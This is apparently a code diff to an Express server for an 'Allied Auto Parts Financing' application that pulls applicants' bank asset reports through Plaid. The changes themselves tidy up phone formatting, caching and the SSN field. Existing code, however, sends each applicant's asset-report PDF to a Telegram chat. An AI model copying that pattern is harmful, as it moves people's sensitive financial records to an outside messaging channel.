@@ -7,7 +7,13 @@ const path = require('path');
 const app = express();
 app.use(express.json({ limit: '5mb' }));
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static(path.join(__dirname, 'public'), {
+  setHeaders(res, filePath) {
+    if (filePath.endsWith('.html')) {
+      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+    }
+  },
+}));
 
 const PORT = process.env.PORT || 3000;
 const PLAID_ENV = process.env.PLAID_ENV || 'production';
@@ -54,6 +60,13 @@ function loadStore() {
 function saveStore(store) {
   ensureDataDir();
   fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2));
+}
+
+function normalizePhoneE164(phone) {
+  const digits = String(phone || '').replace(/\D/g, '');
+  if (digits.length === 10) return `+1${digits}`;
+  if (digits.length === 11 && digits.startsWith('1')) return `+${digits}`;
+  return undefined;
 }
 
 function plaidRequest(endpoint, bodyObj, asBuffer = false) {
@@ -298,6 +311,7 @@ async function fetchAndDeliverAssetReport(appRecord) {
     { asset_report_token: appRecord.assetReportToken },
     true
   );
+
   if (pdfRes.statusCode === 200 && pdfRes.buffer) {
     await sendTelegramDocument(
       `AlliedAuto_${appRecord.id}_AssetReport.pdf`,
@@ -381,21 +395,23 @@ app.post('/api/application/start', async (req, res) => {
       PUBLIC_BASE_URL || `${req.headers['x-forwarded-proto'] || req.protocol}://${req.get('host')}`;
     const webhookUrl = `${baseUrl}/api/plaid/webhook`;
 
+    const userObj = {
+      client_user_id: appId,
+      legal_name: `${firstName} ${lastName}`.trim(),
+      email_address: String(email).trim(),
+    };
+    const e164Phone = normalizePhoneE164(phone);
+    if (e164Phone) {
+      userObj.phone_number = e164Phone;
+    }
+
     const linkBody = {
-      user: {
-        client_user_id: appId,
-        legal_name: `${firstName} ${lastName}`.trim(),
-        phone_number: phone,
-        email_address: email,
-      },
+      user: userObj,
       client_name: 'Allied Auto Parts Financing',
       products: ['assets'],
       country_codes: ['US'],
       language: 'en',
       webhook: webhookUrl,
-      options: {
-        days_requested: days,
-      },
     };
 
     const plaidRes = await plaidRequest('/link/token/create', linkBody);
@@ -490,12 +506,10 @@ app.post('/api/application/complete-bank', async (req, res) => {
       client_user_id: appRecord.id,
       first_name: c.firstName,
       last_name: c.lastName,
-      phone_number: c.phone,
+      phone_number: normalizePhoneE164(c.phone) || c.phone,
       email: c.email,
     };
-    if (c.ssnLast4 && /^\d{4}$/.test(c.ssnLast4)) {
-      userObj.ssn = c.ssnLast4;
-    }
+    // Last-4 only is not a valid Plaid SSN; omit rather than send a fabricated number.
 
     const arRes = await plaidRequest('/asset_report/create', {
       access_tokens: appRecord.accessTokens,
